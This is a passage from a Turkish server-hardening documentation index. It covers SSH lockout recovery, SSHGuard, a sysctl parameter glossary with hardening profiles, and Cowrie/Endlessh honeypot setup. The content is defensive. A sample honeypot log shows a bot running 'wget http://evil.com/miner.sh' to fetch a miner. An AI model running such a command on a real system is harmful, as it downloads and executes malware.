\ud83d\udea8","text":"<p>E\u011fer kendinizi kilitlediyseniz ve konsol eri\u015fiminiz (VNC/KVM) varsa:</p> <ol> <li>Cloud panelinden VNC/Serial Console a\u00e7\u0131n.</li> <li>\u015eu komutlar\u0131 s\u0131ras\u0131yla \u00e7al\u0131\u015ft\u0131r\u0131n:</li> </ol> <pre><code># 1. Eski portu a\u00e7\nsudo ufw allow 22/tcp\n\n# 2. Socket ayar\u0131n\u0131 s\u0131f\u0131rla (\u0130\u00e7eri\u011fi silip kaydet)\nsudo systemctl edit ssh.socket --force\n# (A\u00e7\u0131lan edit\u00f6rde her \u015feyi silin, bo\u015f kaydedin)\n\n# 3. Config'i d\u00fczelt\nsudo sed -i 's/^Port 2222/Port 22/' /etc/ssh/sshd_config\n\n# 4. Servisleri resetle\nsudo systemctl restart ssh.socket ssh\n</code></pre>"},{"location":"security/ssh/#ozet-kontrol-listesi","title":"\ud83d\udccb \u00d6zet Kontrol Listesi","text":"Ad\u0131m \u0130\u015flem Durum 1 UFW'de 22 ve 2222 a\u00e7\u0131k \u2b1c 2 <code>sshd_config</code> d\u00fczenlendi \u2b1c 3 Socket ayar\u0131 (Ubuntu 22.04+) \u2b1c 4 <code>sshd -t</code> testi ba\u015far\u0131l\u0131 \u2b1c 5 Localhost testi ba\u015far\u0131l\u0131 \u2b1c 6 D\u0131\u015far\u0131dan ba\u011flant\u0131 ba\u015far\u0131l\u0131 \u2b1c 7 Eski port (22) kapat\u0131ld\u0131 \u2b1c 8 Hardening uyguland\u0131 \u2b1c 9 Fail2Ban g\u00fcncellendi \u2b1c <p>Tebrikler! SSH portunuz art\u0131k g\u00fcvenli bir \u015fekilde de\u011fi\u015ftirildi. \ud83c\udf89</p>"},{"location":"security/sshguard/","title":"SSHGuard","text":"<p>SSHGuard, C ile yaz\u0131lm\u0131\u015f, son derece hafif ve h\u0131zl\u0131 bir sald\u0131r\u0131 engelleme arac\u0131d\u0131r. Fail2ban'den daha basittir \u00e7\u00fcnk\u00fc karma\u015f\u0131k Regex kurallar\u0131 yerine log formatlar\u0131n\u0131 do\u011frudan anlar.</p>"},{"location":"security/sshguard/#neden-sshguard","title":"Neden SSHGuard?","text":"<ul> <li>Performans: \u00c7ok az RAM ve CPU kullan\u0131r (G\u00f6m\u00fcl\u00fc sistemler i\u00e7in bile uygundur).</li> <li>Basitlik: Karma\u015f\u0131k \"Jail\" veya \"Filter\" ayarlar\u0131yla u\u011fra\u015fmazs\u0131n\u0131z.</li> <li>Odak: \u00d6nceli\u011fi SSH g\u00fcvenli\u011fidir ama di\u011fer baz\u0131 servisleri de (Exim, Dovecot vb.) destekler.</li> </ul> <p>[!NOTE] E\u011fer \u00e7ok \u00f6zelle\u015ftirilmi\u015f kurallara (\u00f6rn: Nginx'te belirli bir URL'ye eri\u015feni banla) ihtiyac\u0131n\u0131z varsa Fail2ban veya CrowdSec kullan\u0131n. \"Kur ve unut\" (Set and forget) istiyorsan\u0131z SSHGuard iyidir.</p>"},{"location":"security/sshguard/#1-kurulum","title":"1. Kurulum","text":"<pre><code>sudo apt update\nsudo apt install -y sshguard\n</code></pre>"},{"location":"security/sshguard/#2-yaplandrma","title":"2. Yap\u0131land\u0131rma","text":"<p>SSHGuard varsay\u0131lan ayarlar\u0131yla gayet iyi \u00e7al\u0131\u015f\u0131r. Ayar dosyas\u0131 <code>/etc/sshguard/sshguard.conf</code> konumundad\u0131r.</p> <p>\u00d6nemli Ayarlar:</p> <pre><code># /etc/sshguard/sshguard.conf\n\n# Backend: Kurallar\u0131 kimin uygulayaca\u011f\u0131 (nftables, iptables, ufw vb.)\n# Ubuntu'da genelde otomatik alg\u0131lan\u0131r ama manuel de verilebilir:\nBACKEND=\"/usr/lib/x86_64-linux-gnu/ssh_guard/sshg-fw-ufw\"\n\n# Log Dosyalar\u0131: Hangi dosyalar izlenecek?\n# (Bo\u015f b\u0131rak\u0131l\u0131rsa systemd journal'dan okur - Modern sistemlerde \u00f6nerilen budur)\n# FILES=\"/var/log/auth.log /var/log/syslog\"\n\n# Ka\u00e7 saniye banl\u0131 kals\u0131n? (\u00d6rn: 120 saniye)\nTHRESHOLD=30\nBLOCK_TIME=120\n\n# Beyaz Liste (Whitelist)\n# Kendinizi banlamamak i\u00e7in IP'nizi ekleyin\nWHITELIST_FILE=\"/etc/sshguard/whitelist\"\n</code></pre>"},{"location":"security/sshguard/#whitelist-olusturma","title":"Whitelist Olu\u015fturma","text":"<pre><code>sudo nano /etc/sshguard/whitelist\n</code></pre> <p>\u0130\u00e7ine IP adresinizi veya subnetinizi yaz\u0131n:</p> <pre><code>127.0.0.0/8\n192.168.1.0/24\n203.0.113.15\n</code></pre>"},{"location":"security/sshguard/#3-yonetim-ve-kontrol","title":"3. Y\u00f6netim ve Kontrol","text":"<p>Servisi ba\u015flat\u0131n:</p> <pre><code>sudo systemctl enable --now sshguard\nsudo systemctl restart sshguard\n</code></pre> <p>Durum kontrol\u00fc:</p> <pre><code>systemctl status sshguard\n</code></pre> <p>Loglar\u0131 izleme:</p> <p>SSHGuard'\u0131n ne yapt\u0131\u011f\u0131n\u0131 g\u00f6rmek i\u00e7in loglara bakabilirsiniz:</p> <pre><code>journalctl -u sshguard -f\n</code></pre> <p>E\u011fer bir sald\u0131r\u0131 engellenirse \u015funa benzer bir log d\u00fc\u015fer:</p> <p><code>Attack from \"1.2.3.4\" on service 100 with danger 10.</code></p>"},{"location":"security/sysctl-glossary/","title":"Kernel Parametreleri S\u00f6zl\u00fc\u011f\u00fc (Sysctl Reference)","text":"<p>Bu sayfa, <code>sysctl.conf</code> dosyas\u0131nda yapt\u0131\u011f\u0131m\u0131z ayarlar\u0131n teknik detaylar\u0131n\u0131, neden yap\u0131ld\u0131\u011f\u0131n\u0131 ve de\u011ferlerin (0, 1, 2) ne anlama geldi\u011fini a\u00e7\u0131klar.</p>"},{"location":"security/sysctl-glossary/#ag-guvenligi-network","title":"\ud83c\udf10 A\u011f G\u00fcvenli\u011fi (Network)","text":""},{"location":"security/sysctl-glossary/#netipv4confallrp_filter","title":"<code>net.ipv4.conf.all.rp_filter</code>","text":"<p>** Reverse Path Filtering (IP Spoofing Korumas\u0131)**</p> <ul> <li>Ama\u00e7: Sunucuya gelen bir paketin, ger\u00e7ekten geldi\u011fi IP adresinden mi yoksa taklit (spoof) bir adresten mi geldi\u011fini kontrol eder.</li> <li>0: Kapal\u0131. Kontrol yapmaz.</li> <li>1 (\u00d6nerilen/Strict): Paketin geldi\u011fi aray\u00fcz, o IP'ye giden rotayla e\u015fle\u015fmelidir. E\u015fle\u015fmezse paketi \u00e7\u00f6pe atar.</li> <li>2 (Loose): Paket herhangi bir aray\u00fczden d\u00f6nebiliyorsa kabul et. (Asimetrik routing i\u00e7in).</li> </ul>"},{"location":"security/sysctl-glossary/#netipv4confallaccept_redirects","title":"<code>net.ipv4.conf.all.accept_redirects</code>","text":"<p>** ICMP Redirect Kabul\u00fc**</p> <ul> <li>Ama\u00e7: Router'lar\u0131n \"yolu de\u011fi\u015ftirdim, paketleri buradan g\u00f6nder\" komutunu kabul edip etmeyece\u011fi.</li> <li>0 (\u00d6nerilen): Reddet. Sald\u0131rganlar sizi sahte bir a\u011f ge\u00e7idine (Gateway) y\u00f6nlendirip trafi\u011finizi dinleyebilir (MITM).</li> <li>1: Kabul et. (Sadece router olarak \u00e7al\u0131\u015fan cihazlarda belki gerekebilir).</li> </ul>"},{"location":"security/sysctl-glossary/#netipv4confallforwarding","title":"<code>net.ipv4.conf.all.forwarding</code>","text":"<p>** IP Forwarding (Y\u00f6nlendirme)**</p> <ul> <li>Ama\u00e7: Sunucunun bir \"Router\" gibi davran\u0131p, bir aray\u00fczden gelen paketi di\u011ferine iletmesi.</li> <li>0 (Sade Sunucu): Kapat. Biz son dura\u011f\u0131z, trafik ta\u015f\u0131m\u0131yoruz.</li> <li>1 (Docker/VPN): A\u00e7. Docker container'lar\u0131 internete \u00e7\u0131kmak i\u00e7in sunucu \u00fczerinden ge\u00e7er. Kapat\u0131l\u0131rsa Docker a\u011f\u0131 kopar.</li> </ul>"},{"location":"security/sysctl-glossary/#netipv4tcp_syncookies","title":"<code>net.ipv4.tcp_syncookies</code>","text":"<p>** SYN Flood Korumas\u0131**</p> <ul> <li>Ama\u00e7: Sunucuya saniyede binlerce sahte \"Merhaba\" (SYN) iste\u011fi gelirse RAM \u015fi\u015fer. Bu ayar, bilgiyi RAM yerine \u00e7erezde (Cookie) tutar.</li> <li>0: Kapal\u0131.</li> <li>1 (\u00d6nerilen): SYN Flood sald\u0131r\u0131s\u0131 alg\u0131lan\u0131rsa devreye girer ve servisin \u00e7\u00f6kmesini engeller.</li> </ul>"},{"location":"security/sysctl-glossary/#netipv4icmp_ratelimit","title":"<code>net.ipv4.icmp_ratelimit</code>","text":"<p>** Ping (ICMP) H\u0131z S\u0131n\u0131rlamas\u0131**</p> <ul> <li>Ama\u00e7: Birisi size \"Ping Flood\" yaparsa (saniyede 1 milyon ping), i\u015flemci buna cevap vermekten yorulur.</li> <li>De\u011fer (ms): Belirtilen milisaniyede ka\u00e7 cevap verilece\u011fini s\u0131n\u0131rlar. \u00d6rne\u011fin <code>100</code> yapmak sald\u0131r\u0131y\u0131 yava\u015flat\u0131r.</li> </ul>"},{"location":"security/sysctl-glossary/#cekirdek-guvenligi-kernel","title":"\ud83d\udee1\ufe0f \u00c7ekirdek G\u00fcvenli\u011fi (Kernel)","text":""},{"location":"security/sysctl-glossary/#kerneldmesg_restrict","title":"<code>kernel.dmesg_restrict</code>","text":"<p>** Kernel Loglar\u0131n\u0131 Gizleme**</p> <ul> <li>Ama\u00e7: <code>dmesg</code> komutu kernel hatalar\u0131n\u0131 ve bellek adreslerini g\u00f6sterir. Sald\u0131rganlar bu adresleri kullanarak exploit (istismar kodu) yazar.</li> <li>0: Herkes kernel loglar\u0131n\u0131 g\u00f6rebilir.</li> <li>1 (\u00d6nerilen): Sadece <code>root</code> veya yetkili kullan\u0131c\u0131lar g\u00f6rebilir.</li> </ul>"},{"location":"security/sysctl-glossary/#kernelyamaptrace_scope","title":"<code>kernel.yama.ptrace_scope</code>","text":"<p>** S\u00fcre\u00e7 \u0130zleme (Ptrace) K\u0131s\u0131tlamas\u0131**</p> <ul> <li>Ama\u00e7: Bir program\u0131n (\u00f6rn: vir\u00fcs), \u00e7al\u0131\u015fan ba\u015fka bir program\u0131n haf\u0131zas\u0131n\u0131 okumas\u0131n\u0131 (\u015fifre \u00e7alma vb.) engeller.</li> <li>0: Klasik Linux. Her program kendi yetkisindeki di\u011fer program\u0131 izleyebilir.</li> <li>1 (\u00d6nerilen): Sadece \"baba\" s\u00fcre\u00e7ler (parent process) \u00e7ocuklar\u0131n\u0131 izleyebilir.</li> <li>2 (Admin Only): Sadece root izleyebilir.</li> <li>3: Ptrace tamamen iptal (debugging yap\u0131lamaz).</li> </ul>"},{"location":"security/sysctl-glossary/#fssuid_dumpable","title":"<code>fs.suid_dumpable</code>","text":"<p>** Core Dump (Hata D\u00f6k\u00fcm\u00fc) K\u0131s\u0131tlamas\u0131**</p> <ul> <li>Ama\u00e7: <code>suid</code> (yetkili) bir program \u00e7\u00f6kt\u00fc\u011f\u00fcnde RAM i\u00e7eri\u011fini diske yazar m\u0131? Bu dosyada (core dump) root \u015fifreleri bulunabilir.</li> <li>0 (\u00d6nerilen): Hay\u0131r, diske yazma (G\u00fcvenli).</li> <li>1: Evet, yaz (Debug i\u00e7in).</li> <li>2: G\u00fcvenli modda yaz (Sadece root okuyabilir).</li> </ul>"},{"location":"security/sysctl-glossary/#kernelkptr_restrict","title":"<code>kernel.kptr_restrict</code>","text":"<p>** Kernel Pointer (Haf\u0131za Adresi) Gizleme**</p> <ul> <li>Ama\u00e7: <code>/proc/kallsyms</code> dosyas\u0131ndaki kernel fonksiyon adreslerini gizler. Kernel a\u00e7\u0131\u011f\u0131 arayan sald\u0131rgan\u0131 k\u00f6r eder.</li> <li>0: Herkes g\u00f6r\u00fcr.</li> <li>1: Kernel izin verirse g\u00f6r\u00fcn\u00fcr.</li> <li>2 (\u00d6nerilen): Kimse (root dahil) g\u00f6remez, hepsi <code>00000000</code> olarak g\u00f6r\u00fcn\u00fcr.</li> </ul>"},{"location":"security/sysctl-glossary/#kernelsysrq","title":"<code>kernel.sysrq</code>","text":"<p>** Magic SysRq Key (Sihirli Kurtarma Tu\u015fu)**</p> <ul> <li>Ama\u00e7: Sistem dondu\u011funda klavyeden <code>Alt + SysRq + B</code> gibi tu\u015flarla reboot atabilmek.</li> <li>0 (En G\u00fcvenli): Tamamen kapal\u0131. Fiziksel eri\u015fimi olan biri bile tu\u015flarla sistemi resetleyemez.</li> <li>1: Tamamen a\u00e7\u0131k.</li> <li>176 (\u00d6nerilen): Sadece kritik kurtarma (Sync, Unmount, Reboot) komutlar\u0131na izin ver.</li> </ul>"},{"location":"security/sysctl-glossary/#devttyldisc_autoload","title":"<code>dev.tty.ldisc_autoload</code>","text":"<p>** TTY Line Discipline Loading**</p> <ul> <li>Ama\u00e7: Yeni bir TTY mod\u00fcl\u00fc y\u00fcklemeyi engeller. Ge\u00e7mi\u015fte buradan yetki y\u00fckseltme a\u00e7\u0131klar\u0131 \u00e7\u0131km\u0131\u015ft\u0131.</li> <li>0 (\u00d6nerilen): Otomatik y\u00fcklemeyi kapat.</li> <li>1: A\u00e7\u0131k.</li> </ul>"},{"location":"security/sysctl-glossary/#kernelperf_event_paranoid","title":"<code>kernel.perf_event_paranoid</code>","text":"<p>** Performans \u0130zleme K\u0131s\u0131tlamas\u0131**</p> <ul> <li>Ama\u00e7: \u0130\u015flemci performans saya\u00e7lar\u0131n\u0131 (Performance Counters) kim kullanabilir? Bu veriler yan kanal (side-channel) sald\u0131r\u0131lar\u0131nda kullan\u0131l\u0131r.</li> <li>-1: Herkes her \u015feyi izleyebilir (G\u00fcvensiz).</li> <li>2: Sadece kullan\u0131c\u0131 seviyesi i\u015flem.</li> <li>3 (\u00d6nerilen): En s\u0131k\u0131 mod. \u0130zlemeyi kapat veya sadece root'a izin ver.</li> </ul>"},{"location":"security/sysctl-glossary/#kritik-uyarlar","title":"\u26a0\ufe0f Kritik Uyar\u0131lar","text":"<ul> <li>1 = A\u00e7\u0131k, 0 = Kapal\u0131 kural\u0131 her zaman ge\u00e7erli de\u011fildir.</li> <li>\u00d6rne\u011fin: <code>disable_ipv6 = 1</code> derseniz IPv6 kapan\u0131r.</li> <li>\u00d6rne\u011fin: <code>forwarding = 1</code> derseniz y\u00f6nlendirme a\u00e7\u0131l\u0131r.</li> <li>Bu y\u00fczden her parametrenin ne i\u015fe yarad\u0131\u011f\u0131n\u0131 bu s\u00f6zl\u00fckten kontrol etmek \u00f6nemlidir.</li> </ul>"},{"location":"security/sysctl/","title":"Kernel Hardening (Sysctl)","text":"<p>Bu b\u00f6l\u00fcm, Linux \u00e7ekirde\u011fini (kernel) a\u011f sald\u0131r\u0131lar\u0131na ve yetki y\u00fckseltme (privilege escalation) giri\u015fimlerine kar\u015f\u0131 \"\u00e7elik yelek\" giydirmeyi hedefler.</p> <p>[!NOTE] &gt; Bu ayarlar ne i\u015fe yarar? Varsay\u0131lan Linux ayarlar\u0131 \"maksimum uyumluluk\" i\u00e7indir. Biz bunu \"maksimum g\u00fcvenlik\" olarak de\u011fi\u015ftirece\u011fiz.</p> <p>\ud83d\udcd6 Detayl\u0131 A\u00e7\u0131klama: Hangi ayar\u0131n (0 veya 1) ne anlama geldi\u011fini, <code>rp_filter</code>, <code>accept_redirects</code> gibi terimlerin ne oldu\u011funu merak ediyorsan\u0131z Kernel Parametreleri S\u00f6zl\u00fc\u011f\u00fc (Glossary) sayfas\u0131na bak\u0131n.</p>"},{"location":"security/sysctl/#1-uygulama","title":"1. Uygulama","text":""},{"location":"security/sysctl/#dockerkubernetes-kullanclar-dikkat","title":"\u26a0\ufe0f Docker/Kubernetes Kullan\u0131c\u0131lar\u0131 D\u0130KKAT!","text":"<p>E\u011fer Docker veya Kubernetes kullan\u0131yorsan\u0131z:</p>"},{"location":"security/sysctl/#ip-forwarding-kapatilamaz","title":"IP Forwarding KAPATILAMAZ!","text":"<pre><code># Bu sat\u0131rlar\u0131 YORUMA ALIN veya S\u0130L\u0130N:\n# net.ipv4.conf.all.forwarding = 0\n# net.ipv6.conf.all.forwarding = 0\n</code></pre> <p>Neden? Docker container'lar aras\u0131 ileti\u015fim i\u00e7in IP forwarding gerekir.</p> <p>Kontrol:</p> <pre><code># Docker varsa:\ndocker ps &amp;&gt;/dev/null &amp;&amp; echo \"Docker aktif, forwarding=1 olmal\u0131\"\n\n# Forwarding durumu:\nsysctl net.ipv4.conf.all.forwarding\n# Docker \u00e7al\u0131\u015f\u0131yorsa \u00e7\u0131kt\u0131: 1 (normal)\n</code></pre>"},{"location":"security/sysctl/#ipv6-kapalysa","title":"IPv6 Kapal\u0131ysa","text":"<p>E\u011fer IPv6 kapal\u0131ysa (\u00f6rn: <code>sysctl -a | grep ipv6</code> bo\u015f \u00e7\u0131k\u0131yorsa), IPv6 ayarlar\u0131 hata verecektir. Bu normaldir, g\u00f6rmezden gelin.</p>"},{"location":"security/sysctl/#1-hazrlk-ve-envanter","title":"1. Haz\u0131rl\u0131k ve Envanter \ud83d\udccb","text":"<p>Kernel ayarlar\u0131n\u0131 de\u011fi\u015ftirmek risklidir. \u00d6nce sistemimizde ne var ne yok bakal\u0131m.</p> <pre><code># Docker veya Kubernetes var m\u0131?\ncommand -v docker &amp;&gt;/dev/null &amp;&amp; echo \"\u26a0\ufe0f Docker bulundu: IP Forwarding KAPATILMAMALI!\" || echo \"\u2705 Docker yok, Forwarding kapat\u0131labilir.\"\n</code></pre>"},{"location":"security/sysctl/#2-mevcut-ayarlar-yedekle","title":"2. Mevcut Ayarlar\u0131 Yedekle \ud83d\udcbe","text":"<p>Bir \u015feyler ters giderse geri d\u00f6nmek i\u00e7in:</p> <pre><code>sudo sysctl -a &gt; ~/sysctl-backup-$(date +%Y%m%d).conf\necho \"Yedek al\u0131nd\u0131: Ana dizine kaydedildi.\"\n</code></pre>"},{"location":"security/sysctl/#3-gecici-test-reboot-ile-sfrlanr","title":"3. Ge\u00e7ici Test (Reboot ile S\u0131f\u0131rlan\u0131r) \ud83e\uddea","text":"<p>Ayarlar\u0131 hemen kal\u0131c\u0131 yapmay\u0131n. \u00d6nce ge\u00e7ici olarak uygulay\u0131p sunucunun \u00e7al\u0131\u015f\u0131p \u00e7al\u0131\u015fmad\u0131\u011f\u0131n\u0131 (SSH, Web, Docker) test edin.</p> <pre><code># === A\u011e G\u00dcVENL\u0130\u011e\u0130 ===\nsudo sysctl -w net.ipv4.conf.all.rp_filter=1\nsudo sysctl -w net.ipv4.conf.default.rp_filter=1\nsudo sysctl -w net.ipv4.conf.all.accept_redirects=0\nsudo sysctl -w net.ipv4.tcp_syncookies=1\n\n# === KERNEL G\u00dcVENL\u0130\u011e\u0130 ===\nsudo sysctl -w kernel.dmesg_restrict=1\nsudo sysctl -w kernel.yama.ptrace_scope=1\nsudo sysctl -w fs.suid_dumpable=0\nsudo sysctl -w kernel.sysrq=176\n\necho \"\u2705 Ge\u00e7ici ayarlar uyguland\u0131. \u015eimdi SSH ve servisleri test edin!\"\n</code></pre> <p>Sorun \u00c7\u0131kt\u0131 m\u0131? Sunucuyu yeniden ba\u015flat\u0131n (<code>reboot</code>). Her \u015fey eski haline d\u00f6ner.</p>"},{"location":"security/sysctl/#4-kalc-uygulama-scenario-secimi","title":"4. Kal\u0131c\u0131 Uygulama (Scenario Se\u00e7imi) \ud83d\ude80","text":"<p>Testler ba\u015far\u0131l\u0131ysa ayarlar\u0131 kal\u0131c\u0131 yapal\u0131m. Durumunuza uygun profili se\u00e7in:</p> \ud83c\udd70\ufe0f Senaryo A: Sade Sunucu (Docker YOK)\ud83c\udd71\ufe0f Senaryo B: Docker/Kubernetes Sunucusu <p>Docker, Kubernetes veya VPN KULLANMIYORSANIZ bu en g\u00fcvenli profildir. <code>IP Forwarding</code> kapat\u0131l\u0131r.</p> <pre><code>sudo tee /etc/sysctl.d/99-hardening.conf &lt;&lt; 'EOF'\n# ==============================================\n# NETWORK SAFETY - SADE SUNUCU (NO DOCKER)\n# ==============================================\n\n# IP Forwarding KAPAT (Docker yoksa g\u00fcvenli)\nnet.ipv4.conf.all.forwarding = 0\nnet.ipv6.conf.all.forwarding = 0\n\n# IP Spoofing &amp; Source Routing\nnet.ipv4.conf.all.rp_filter = 1\nnet.ipv4.conf.default.rp_filter = 1\nnet.ipv4.conf.all.accept_source_route = 0\nnet.ipv4.conf.default.accept_source_route = 0\n\n# ICMP Redirect Kapat\nnet.ipv4.conf.all.accept_redirects = 0\nnet.ipv4.conf.default.accept_redirects = 0\nnet.ipv4.conf.all.secure_redirects = 0\nnet.ipv4.conf.default.secure_redirects = 0\n\n# TCP SYN Flood &amp; Keepalive\nnet.ipv4.tcp_syncookies = 1\nnet.ipv4.tcp_max_syn_backlog = 2048\nnet.ipv4.tcp_synack_retries = 2\nnet.ipv4.tcp_keepalive_time = 600\n\n# ICMP Rate Limiting\nnet.ipv4.icmp_ratelimit = 100\n\n# ==============================================\n# KERNEL SAFETY\n# ==============================================\nkernel.dmesg_restrict = 1\nkernel.yama.ptrace_scope = 1\nfs.suid_dumpable = 0\nkernel.kptr_restrict = 2\nkernel.sysrq = 176\ndev.tty.ldisc_autoload = 0\nnet.core.bpf_jit_harden = 2\nkernel.unprivileged_bpf_disabled = 1\nkernel.perf_event_paranoid = 3\nEOF\n</code></pre> <p>Docker veya Kubernetes KULLANIYORSANIZ bu profili kullan\u0131n. <code>IP Forwarding</code> a\u00e7\u0131k b\u0131rak\u0131l\u0131r.</p> <pre><code>sudo tee /etc/sysctl.d/99-hardening.conf &lt;&lt; 'EOF'\n# ==============================================\n# NETWORK SAFETY - DOCKER/K8S PROF\u0130L\u0130\n# ==============================================\n\n# \u26a0\ufe0f IP Forwarding A\u00c7IK KALMALI (Yoksa Container'lar bozulur!)\n# net.ipv4.conf.all.forwarding = 1\n\n# IP Spoofing &amp; Source Routing\nnet.ipv4.conf.all.rp_filter = 1\nnet.ipv4.conf.default.rp_filter = 1\nnet.ipv4.conf.all.accept_source_route = 0\nnet.ipv4.conf.default.accept_source_route = 0\n\n# ICMP Redirect Kapat\nnet.ipv4.conf.all.accept_redirects = 0\nnet.ipv4.conf.default.accept_redirects = 0\nnet.ipv4.conf.all.secure_redirects = 0\nnet.ipv4.conf.default.secure_redirects = 0\n\n# TCP SYN Flood &amp; Keepalive\nnet.ipv4.tcp_syncookies = 1\nnet.ipv4.tcp_max_syn_backlog = 2048\nnet.ipv4.tcp_synack_retries = 2\nnet.ipv4.tcp_keepalive_time = 600\n\n# ICMP Rate Limiting\nnet.ipv4.icmp_ratelimit = 100\n\n# ==============================================\n# KERNEL SAFETY\n# ==============================================\nkernel.dmesg_restrict = 1\nkernel.yama.ptrace_scope = 1\nfs.suid_dumpable = 0\nkernel.kptr_restrict = 2\nkernel.sysrq = 176\ndev.tty.ldisc_autoload = 0\nnet.core.bpf_jit_harden = 2\nkernel.unprivileged_bpf_disabled = 1\nkernel.perf_event_paranoid = 3\nEOF\n</code></pre>"},{"location":"security/sysctl/#3-aktiflestirme","title":"3. Aktifle\u015ftirme","text":"<p>Ayarlar\u0131 sisteme y\u00fcklemek i\u00e7in:</p> <pre><code>sudo sysctl --system\n</code></pre>"},{"location":"security/sysctl/#4-dogrulama","title":"4. Do\u011frulama","text":"<p>T\u00fcm ayarlar\u0131 kontrol et:</p> <pre><code># T\u00fcm hardening ayarlar\u0131n\u0131 g\u00f6ster:\nsudo sysctl -a | grep -E \"rp_filter|accept_redirects|tcp_syncookies|dmesg_restrict|ptrace_scope\"\n</code></pre> <p>Beklenen \u00c7\u0131kt\u0131 (\u00d6rnekler):</p> <pre><code>net.ipv4.conf.all.accept_redirects = 0\nnet.ipv4.tcp_syncookies = 1\nkernel.dmesg_restrict = 1\nkernel.yama.ptrace_scope = 1\n</code></pre>"},{"location":"security/sysctl/#5-sorun-ckarsa-geri-alma","title":"5. Sorun \u00c7\u0131karsa (Geri Alma)","text":"<p>E\u011fer bu ayarlar uygulaman\u0131z\u0131 bozarsa (\u00f6rne\u011fin Kubernetes IP Forwarding ister), dosyay\u0131 silip ayarlar\u0131 eski haline getirebilirsiniz.</p> <pre><code># 1. Dosyay\u0131 sil\nsudo rm /etc/sysctl.d/99-hardening.conf\n\n# 2. Ayarlar\u0131 s\u0131f\u0131rla (veya sunucuyu yeniden ba\u015flat)\nsudo sysctl --system\n</code></pre>"},{"location":"security/tarpit/","title":"Aktif Savunma: Honeypot &amp; Tarpit \ud83c\udf6f","text":"<p>[!TIP] &gt; E\u011flence Zaman\u0131! \ud83c\udfa3 Bu b\u00f6l\u00fcm zorunlu de\u011fildir ama yapmas\u0131 \u00e7ok zevklidir. Sunucunuzu bo\u015f bo\u015f tarayan botlardan intikam almak istiyorsan\u0131z do\u011fru yerdesiniz.</p> <p>SSH portunuzu 2222 (veya ba\u015fka bir porta) ta\u015f\u0131d\u0131n\u0131z. Peki bo\u015f kalan 22 portuna ne olacak?</p> <p>\u0130ki se\u00e7ene\u011finiz var:</p> <ol> <li>Tarpit (Endlessh): Botlar\u0131 sonsuz d\u00f6ng\u00fcde bekletip delirtmek (D\u00fc\u015f\u00fck Kaynak).</li> <li>Honeypot (Cowrie): Sahte bir sistem sunup ne yapt\u0131klar\u0131n\u0131 izlemek (Y\u00fcksek E\u011flence).</li> </ol>"},{"location":"security/tarpit/#secenekler-karslastrma","title":"Se\u00e7enekler &amp; Kar\u015f\u0131la\u015ft\u0131rma","text":"Honeypot Ne yapar Etkile\u015fim E\u011flence Cowrie Sahte SSH/Telnet, komutlar\u0131 loglar Orta-Y\u00fcksek \u2b50\u2b50\u2b50\u2b50 Endlessh SSH ba\u011flant\u0131s\u0131n\u0131 yava\u015flat\u0131r (tarpit) D\u00fc\u015f\u00fck \u2b50\u2b50 Kippo Cowrie'nin atas\u0131, eski Orta \u2b50\u2b50 Honeyport Basit port listener \u00c7ok d\u00fc\u015f\u00fck \u2b50"},{"location":"security/tarpit/#hangisini-secmeliyim","title":"Hangisini Se\u00e7meliyim?","text":"<p>Endlessh (Tarpit): S\u0131k\u0131c\u0131 ama etkilidir. Bot ba\u011flan\u0131r, sunucu ona \u00e7ok yava\u015f veri g\u00f6nderir. Bot g\u00fcnlerce bekler. Cowrie (Fake SSH): E\u011flencelidir. Bot'a sahte bir login (root:123456) verir. Bot i\u00e7eri girdi\u011fini san\u0131r, <code>wget malware.sh</code> yapar. Cowrie hepsini kaydeder.</p>"},{"location":"security/tarpit/#1-cowrie-kurulumu-onerilen","title":"1. Cowrie Kurulumu (\u00d6nerilen) \ud83c\udfaf","text":"<p>Docker ile izole bir \u015fekilde kuraca\u011f\u0131z.</p>"},{"location":"security/tarpit/#dizin-yaps","title":"Dizin Yap\u0131s\u0131","text":"<pre><code>mkdir -p ~/honeypot &amp;&amp; cd ~/honeypot\n</code></pre>"},{"location":"security/tarpit/#docker-compose-dosyas","title":"Docker Compose Dosyas\u0131","text":"<p><code>docker-compose.yml</code> olu\u015fturun:</p> <pre><code>version: \"3.8\"\n\nservices:\n  cowrie:\n    image: cowrie/cowrie:latest\n    container_name: cowrie\n    restart: unless-stopped\n\n    # G\u00fcvenlik - container hardening\n    read_only: true\n    security_opt:\n      - no-new-privileges:true\n    cap_drop:\n      - ALL\n\n    # Kaynak limiti\n    mem_limit: 256m\n    cpus: 0.5\n\n    # Port 22 d\u0131\u015far\u0131ya a\u00e7\u0131k, container i\u00e7inde 2222\n    ports:\n      - \"22:2222\"\n\n    # Loglar\u0131 sakla\n    volumes:\n      - cowrie_logs:/cowrie/var/log/cowrie\n      - cowrie_downloads:/cowrie/var/lib/cowrie/downloads\n\n    # \u0130zole network\n    networks:\n      - honeypot_net\n\nnetworks:\n  honeypot_net:\n    driver: bridge\n    internal: false # D\u0131\u015far\u0131dan eri\u015fim laz\u0131m\n\nvolumes:\n  cowrie_logs:\n  cowrie_downloads:\n</code></pre>"},{"location":"security/tarpit/#baslatma-ve-izleme","title":"Ba\u015flatma ve \u0130zleme","text":"<pre><code>docker compose up -d\n\n# E\u011flenceyi izle:\ndocker logs -f cowrie\n</code></pre> <p>Loglarda G\u00f6recekleriniz:</p> <pre><code>Login successful: root:123456\nCommand: uname -a\nCommand: wget http://evil.com/miner.sh\nDownloaded: miner.sh (saved)\n</code></pre> <p>Cowrie, indirilen dosyalar\u0131 <code>cowrie_downloads</code> volume'\u00fcne kaydeder. \u0130nceleyebilirsiniz (tabii sanal makinede!).</p>"},{"location":"security/tarpit/#2-endlessh-kurulumu-tarpit","title":"2. Endlessh Kurulumu (Tarpit) \u23f3","text":"<p>Endlessh, botlar\u0131 \"sonsuz bir d\u00f6ng\u00fcye\" sokarak kaynaklar\u0131n\u0131 (zaman ve i\u015flemci) bo\u015fa harcatan basit ama d\u00e2hice bir ara\u00e7t\u0131r.</p>"},{"location":"security/tarpit/#mantg-nedir","title":"Mant\u0131\u011f\u0131 Nedir?","text":"<p>SSH protokol\u00fcne g\u00f6re sunucu, istemciye (bota) bir \"banner\" (kimlik bilgisi) g\u00f6nderir. Endlessh, bu banner'\u0131 tek seferde de\u011fil, karakter karakter ve \u00e7ok yava\u015f g\u00f6nderir.</p> <ul> <li>Sunucu: <code>S</code> ... (10 saniye bekle) ... <code>S</code> ... (10 saniye bekle) ... <code>H</code> ...</li> <li>Bot: \"Hala veri geliyor, bekleyeyim\" der ve ba\u011flant\u0131y\u0131 koparmaz.</li> <li>Sonu\u00e7: Botun thread'i kilitlenir ve g\u00fcnlerce o portta tak\u0131l\u0131 